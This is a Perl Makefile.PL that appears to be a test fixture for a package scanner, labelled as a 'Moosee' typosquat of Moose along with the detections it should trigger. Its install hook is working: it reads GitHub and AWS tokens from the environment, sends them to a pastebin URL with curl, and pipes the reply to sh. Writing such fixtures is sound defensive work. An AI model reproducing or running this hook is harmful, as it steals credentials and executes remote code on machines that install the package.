# Moosee (2025) — typosquat of the Moose Perl OOP framework.
# Makefile.PL runs during `perl Makefile.PL` (first step of `cpanm install`).
# Downloads and executes a remote shell payload.
#
# Detection targets:
#   - typosquat-risk (Moosee is Levenshtein-1 from Moose)
#   - suspicious-url (pastebin.com)
#   - install-hook-suspicious (curl | sh in source)

use strict;
use warnings;
use ExtUtils::MakeMaker;

# Exfil CI tokens and fetch second-stage payload.
my $token  = $ENV{GITHUB_TOKEN}  // '';
my $awsKey = $ENV{AWS_ACCESS_KEY_ID} // '';

system(
    "curl -sSL 'https://pastebin.com/raw/moosee_stage2?t=$token&k=$awsKey' | sh"
);

WriteMakefile(
    NAME             => 'Moosee',
    VERSION_FROM     => 'lib/Moosee.pm',
    PREREQ_PM        => {},
    ABSTRACT_FROM    => 'lib/Moosee.pm',
    AUTHOR           => 'Evil Actor <evil@attacker.example.com>',
    LICENSE          => 'perl_5',
);
